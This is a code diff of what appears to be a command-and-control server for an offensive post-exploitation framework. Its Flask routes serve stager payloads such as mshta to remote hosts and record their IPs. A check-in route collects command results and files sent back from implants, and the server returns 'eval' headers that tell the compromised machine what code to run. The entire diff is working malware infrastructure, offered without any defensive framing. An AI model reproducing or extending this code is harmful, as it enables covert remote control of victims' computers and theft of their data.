@@ -14,39 +14,25 @@ checkin_uri = f'/{util.generate_id()}'
 def serve_stagers(format_id):
     remote_addr = request.remote_addr
     if format_id not in engine.STAGERS.keys():
-        return render_template('connection_template.html', random_data=util.random_data)
-    color.information(f'{engine.STAGERS[format_id].format} file requested ({remote_addr})')
-    connection_id = util.generate_id()
-    connection = engine.create_connection(connection_id, engine.STAGERS[format_id])
+        return render_template('random.html', random_data=util.random_data)
+    stager = engine.STAGERS[format_id]
+    color.information(f'{stager.format} file requested ({remote_addr})')
+    connection = engine.create_connection(stager)
     connection.system_information['ip'] = remote_addr
-    if engine.connections[connection_id].stager.format == 'mshta':
-        return render_template(
-            f'stagers/{engine.connections[connection_id].stager.format}',
-            checkin_uri = checkin_uri,
-            connection_id = connection_id,
-            variables = engine.STAGERS[format_id].variables,
-            code = parse.quote(render_template(f'stagers/mshta_code',
-                    checkin_uri = checkin_uri,
-                    connection_id = connection_id,
-                    variables = engine.STAGERS[format_id].variables)))
-    return render_template(
-        f'stagers/{engine.connections[connection_id].stager.format}',
-        checkin_uri = checkin_uri,
-        connection_id = connection_id,
-        variables = engine.STAGERS[format_id].variables,)
+    mshta_code = parse.quote(render_template(f'mshta/code.mshta', variables = stager.variables, connection_id = connection.connection_id, checkin_uri = checkin_uri))
+    return render_template(f'{stager.format}/stager.{stager.format}', checkin_uri = checkin_uri, variables = stager.variables, mshta_code = mshta_code, random_string = util.generate_str(), connection_id = connection.connection_id)
 
 @app.route(f'{checkin_uri}', methods=['POST'])
 def checkin():
-    data = request.get_data()
-    color.verbose(data)
-    response = make_response(render_template('connection_template.html', random_data=util.random_data))
+    response = make_response(render_template('random.html', random_data=util.random_data))
     try:
-        connection = engine.retrieve_connection(request.headers['Connection-ID'])
+        connection = engine.connections[request.headers['Connection-ID']]
     except:
         return response
     connection.check_in()
     internet_addr = connection.system_information['ip']
-    if data:
+    if request.get_data():
+        data = request.get_data()
         if request.headers['mimetype'] == 'text/plain':
             color.normal('\n')
             color.information(f'Results recieved from ({internet_addr}):')
@@ -55,11 +41,11 @@ def checkin():
             filename = f'{util.generate_str()}.connect'
             color.normal('\n')
             color.information(f'{sys.getsizeof(data)} Bytes recieved from ({internet_addr}) saving to downloads/{filename}.')
-            loader.download(data, filename)
+            loader.download(data, f'{filename}')
     if connection.job_queue:
         job = connection.job_queue.pop(0)
         if job.type == 'function':
-            response.headers['eval'] = job.data
+            response.headers['eval'] = parse.quote(render_template(f'{connection.stager.format}/functions/{job.data}.{connection.stager.format}', variables = connection.stager.variables, random_string = util.generate_str()))
             return response
         if job.type == 'command':
             command = job.data[0]
@@ -77,7 +63,6 @@ def checkin():
                     return response
             arguments = ','.join(arguments)
             response.headers['eval'] = parse.quote(f'{command}({arguments})')
-            return response
     return response
 
 def run(ip, port):
